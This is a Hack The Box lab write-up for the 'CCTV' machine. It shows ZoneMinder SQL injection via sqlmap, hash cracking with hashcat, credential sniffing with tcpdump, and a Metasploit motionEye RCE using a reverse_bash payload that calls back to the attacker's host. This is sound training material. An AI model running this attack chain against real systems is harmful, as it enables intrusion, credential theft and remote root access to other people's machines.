---
title: "HTB: CCTV"
date: 2026-04-03
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - linux
  - medium
  - zoneminder
  - sql-injection
  - password-cracking
  - tcpdump-capture
  - motioneye
  - CVE-2024-51482
  - CVE-2025-60787
description: "CCTV is a medium Linux box featuring ZoneMinder SQL injection, credential reuse through packet capture, and motionEye authenticated RCE."
summary: "CCTV is a medium Linux box featuring ZoneMinder SQL injection, credential reuse through packet capture, and motionEye authenticated RCE."
cover:
  image: "/images/htb-cctv/info-card.png"
  alt: "HTB CCTV"
  relative: false
showToc: true
TocOpen: false
---

## Box Info

CCTV is a medium Linux machine from Hack The Box. It starts with a company website running ZoneMinder 1.37.63, vulnerable to SQL injection (CVE-2024-51482). After dumping and cracking the database hashes, I get SSH access as mark. From mark, I use tcpdump (which has the `cap_net_raw` capability) to sniff plaintext credentials for sa\_mark. That user has access to an internal motionEye instance vulnerable to authenticated RCE (CVE-2025-60787), leading to a root shell.

### Kill Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | Default creds on ZoneMinder (`admin:admin`) | Authenticated access |
| 2 | SQLi via CVE-2024-51482, dump Users table | Bcrypt hashes for 3 accounts |
| 3 | Crack mark's hash with hashcat | `mark:opensesame` |
| 4 | SSH as mark, tcpdump with `cap_net_raw` | Sniff sa\_mark's plaintext creds |
| 5 | SSH as sa\_mark, port forward 8765 | Access internal motionEye instance |
| 6 | Exploit CVE-2025-60787 via Metasploit | Root shell |

## Recon

### nmap

Quick port sweep followed by a service scan:

```console
$ nmap -p- --min-rate 10000 10.129.244.156
...[snip]...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...[snip]...
```

```console
$ nmap -sCV -p 22,80 10.129.244.156
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
|_  256 e3:9b:38:08:9a:d7:e9:d1:94:11:ff:50:80:bc:f2:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Just two ports open. HTTP redirects to `cctv.htb`, so I add that to `/etc/hosts`.

### SecureVision Website - TCP 80

The website is for "SecureVision", a CCTV and security solutions company.

![SecureVision homepage showing CCTV monitoring services](/images/htb-cctv/securevision-homepage.png)

Nothing useful on the static pages. There's a "Staff Login" button in the top-right that leads to a ZoneMinder login panel at `/zm/`:

![ZoneMinder login panel](/images/htb-cctv/zoneminder-login.png)

I try `admin:admin` and it works.

### ZoneMinder - TCP 80

The ZoneMinder dashboard has no cameras configured, but the version is visible in the top-right: **1.37.63**.

![ZoneMinder dashboard showing version 1.37.63 in the top-right corner](/images/htb-cctv/zoneminder-dashboard-version.png)

Looking up this version, CVE-2024-51482 comes up right away. It's a SQL injection in the event tag removal endpoint, documented in this [ZoneMinder security advisory](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3).

## Shell as mark

### CVE-2024-51482 - ZoneMinder SQL Injection

This is an authenticated SQL injection affecting ZoneMinder versions before 1.37.64. The `tid` parameter in `/zm/index.php?view=request&request=event&action=removetag` goes straight into a SQL query with no sanitization. I already have valid creds from the default login, so I can use this to dump the database.

### Exploiting the SQLi with sqlmap

I browse to the vulnerable endpoint and catch the request in Burp:

```text
http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1
```

![Burp Suite intercepted request to the vulnerable removetag endpoint](/images/htb-cctv/burp-sqli-request.png)

I save the request to a file and point sqlmap at the Users table:

```console
$ sqlmap -r req.txt --batch --risk=3 --level=5 --time-sec=1 --threads=10 -D zm -T Users -C "Username,Password" --dump
...[snip]...
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
...[snip]...
```

Three bcrypt hashes (`$2y$10$`, cost factor 10).

### Cracking the Hashes

Into hashcat with rockyou:

```console
$ hashcat hashes.txt rockyou.txt --username -m 3200
...[snip]...
mark:$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.:opensesame
...[snip]...
```

Only mark's hash cracks to `opensesame`. The other two don't fall to rockyou, but one cracked password is enough.

### SSH as mark

I try the cracked password over SSH:

```console
$ ssh mark@cctv.htb
mark@cctv.htb's password: opensesame
```

![SSH shell as mark showing uid=1000](/images/htb-cctv/shell-as-mark.png)

And I have a shell as mark.

## Shell as sa\_mark

### Enumerating Capabilities

I check the usual privesc vectors. `sudo -l` gives nothing, so I look at Linux capabilities:

```console
$ getcap -r / 2>/dev/null
...[snip]...
/usr/bin/tcpdump cap_net_raw=eip
...[snip]...
```

`tcpdump` has `cap_net_raw`, which means any user can capture network traffic. On a CCTV-themed box, there might be some service sending credentials over the network.

### Sniffing Credentials with tcpdump

I start a capture and let it run:

```console
$ /usr/bin/tcpdump -i any -nn -w /tmp/capture.pcap
```

After a couple minutes, I stop it and look for credentials:

```console
$ strings /tmp/capture.pcap | grep -iE "pass|user|login"
...[snip]...
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=statusG
...[snip]...
```

Plaintext credentials for `sa_mark` right there in the capture.

![Shell as sa_mark after switching users](/images/htb-cctv/shell-as-sa-mark.png)

```console
$ su - sa_mark
Password: X1l9fx1ZjS7RZb
$ cat user.txt
82ba7ae5************************
```

## Shell as root

### Discovering motionEye

I check what's listening locally:

```console
$ ss -tlnp
...[snip]...
LISTEN   0   128   127.0.0.1:8765   0.0.0.0:*
...[snip]...
```

Port 8765 on localhost. I forward it through SSH:

```console
ssh> -L 8765:127.0.0.1:8765
Forwarding port.
```

Browsing to `http://127.0.0.1:8765/` shows a motionEye instance. I log in with `admin:X1l9fx1ZjS7RZb` (same password as sa\_mark).

In the preferences I can see **motionEye version 0.43.1b4** running on Motion 4.7 and Ubuntu 24.04:

![motionEye preferences showing version 0.43.1b4 on Ubuntu 24.04](/images/htb-cctv/motioneye-version.png)

### Exploitation via Metasploit

This version is vulnerable to CVE-2025-60787, an authenticated RCE. The exploit is on [Exploit-DB](https://www.exploit-db.com/exploits/52481). There's a Metasploit module for it:

```console
msf6 > use exploit/linux/http/motioneye_auth_rce_cve_2025_60787
msf6 exploit(...) > set password X1l9fx1ZjS7RZb
msf6 exploit(...) > set rhost 127.0.0.1
msf6 exploit(...) > set rport 8765
msf6 exploit(...) > set lhost 10.10.15.229
msf6 exploit(...) > set payload cmd/unix/reverse_bash
msf6 exploit(...) > run
```

![Root shell showing uid=0(root)](/images/htb-cctv/root-shell.png)

```console
# cat root.txt
d96198e8************************
```

And that's root.

## Credentials

| User | Password / Hash | Source |
|------|----------------|--------|
| admin | admin | ZoneMinder default login |
| superadmin | `$2y$10$cmytVWFR...` (uncracked) | ZoneMinder SQLi dump |
| mark | opensesame | Cracked from ZoneMinder bcrypt hash |
| admin | `$2y$10$t5z8uIT....` (uncracked) | ZoneMinder SQLi dump |
| sa\_mark | X1l9fx1ZjS7RZb | tcpdump packet capture |
| admin | X1l9fx1ZjS7RZb | motionEye login (password reuse) |
